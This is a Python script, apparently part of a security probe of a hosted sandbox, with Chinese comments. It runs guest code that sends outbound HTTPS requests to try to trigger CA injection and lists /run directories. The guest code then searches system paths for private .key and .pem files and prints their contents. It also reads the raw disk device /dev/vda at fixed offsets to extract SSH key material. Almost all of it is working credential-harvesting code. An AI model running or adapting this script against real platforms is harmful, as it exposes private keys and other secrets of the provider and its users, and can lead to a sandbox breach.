# -*- coding: utf-8 -*-
"""Phase42: 触发式CA挂载验证 + /run/cell 全目录列举 + key 文件搜索 + ssh 区域提取"""
import sys, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, fresh_sandbox_deny_all

GUEST = r'''
import os, subprocess, glob

# 0) before: does /run/cell exist?
print('[before] /run/cell:', os.path.exists('/run/cell'), flush=True)

# 1) trigger outbound HTTPS (deny-all will reject, but may trigger CA injection)
try:
    subprocess.run(['curl', '-sk', '--max-time', '5', 'https://api.vercel.com/'],
                   capture_output=True, timeout=10)
except Exception as e:
    print('curl exc', e, flush=True)
try:
    import urllib.request
    urllib.request.urlopen('https://api.vercel.com', timeout=5)
except Exception as e:
    print('urlopen exc', type(e).__name__, flush=True)

time.sleep(3)

# 2) after: list /run/cell fully
print('[after] /run/cell:', os.path.exists('/run/cell'), flush=True)
for d in ['/run/cell', '/run/vercel/share', '/run/vercel', '/run']:
    try:
        print('== ls %s ==' % d, flush=True)
        r = subprocess.run(['ls', '-la', d], capture_output=True, text=True)
        print(r.stdout, r.stderr, flush=True)
    except Exception as e:
        print('ls %s EXC %s' % (d, e), flush=True)

# 3) find key/cert files in likely dirs
for pat in ['/run/**/*.key', '/run/**/*.pem', '/etc/**/*.key', '/etc/**/*.pem',
            '/opt/**/*.key', '/opt/**/*.pem', '/usr/local/**/*.key',
            '/var/**/*.key']:
    try:
        for f in glob.glob(pat, recursive=True):
            try:
                st = os.stat(f)
                print('[FOUND %s] size=%d mode=%o' % (f, st.st_size, st.st_mode & 0o777), flush=True)
                if st.st_size < 5000:
                    head = open(f, 'rb').read(200)
                    print('   head: %r' % head[:150], flush=True)
            except Exception as e:
                print('[FOUND %s] stat EXC %s' % (f, e), flush=True)
    except Exception as e:
        print('glob %s EXC %s' % (pat, e), flush=True)

# 4) ssh-ed25519 region extract (small task)
fd = os.open('/dev/vda', os.O_RDONLY)
for off in [0x6b398c395, 0x6b398d38e]:
    try:
        chunk = os.pread(fd, 1536, off - 512)
        print('[ssh 0x%x] %r' % (off, chunk.replace(b'\x00', b' ')[:1400]), flush=True)
    except Exception as e:
        print('[ssh] EXC %s' % e, flush=True)
os.close(fd)
print('done', flush=True)
'''
code = "cat > /tmp/pg50.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg50.py"

if __name__ == "__main__":
    sid = fresh_sandbox_deny_all("fwtest20")
    time.sleep(2)
    c, r = cmd(sid, "bash", ["-lc", code], timeout_ms=120000)
    print('cmd:', c, flush=True)
    print(r[:16000], flush=True)
